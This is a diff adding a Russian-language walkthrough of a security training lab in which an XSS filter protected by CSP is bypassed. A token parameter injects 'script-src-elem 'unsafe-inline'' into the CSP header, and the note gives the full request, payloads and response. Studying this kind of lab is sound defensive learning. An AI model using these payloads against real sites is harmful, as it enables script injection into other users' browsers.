@@ -75,7 +75,32 @@ img-src https://images.normal-website.com
 
 Как правило, перезаписать существующую директиву `script-src` невозможно. Однако недавно Chrome представил директиву `script-src-elem`, которая позволяет контролировать элементы `script`, но не события. Критически важно, что эта новая директива позволяет перезаписывать существующие директивы `script-src`. Используя это знание вы можете решить следующую лабораторную работу:
 # Пример Lab: Reflected XSS protected by CSP, with CSP bypass
- 
+ Для решения работы необходимо попробовать внедрить 
+
+```
+<img src=x onerror=alert(1)>
+```
+
+после чего появится 
+
+```
+POST /csp-report?token=
+```
+
+с пустым токеном который не отображается в замом запросе, но это параметр при запросе `/?search=123&token=input` содержимое которого вставляется напрямую в ответ заголовка CSP
+
+```
+GET /?search=<script>alert(1)</script>&token=123; script-src-elem 'unsafe-inline' HTTP/2
+
+
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=123; script-src-elem 'unsafe-inline'
+X-Frame-Options: SAMEORIGIN
+Content-Length: 3275
+```
+
+после того как мы изменили политику инжектим в search наш параметр для `alert`, я использовал  `<script>alert(1)</script>` После чего функция исполняется и лабораторная засчитывается
 
 ---
 # Защита от Clickjacking с помощью CSP
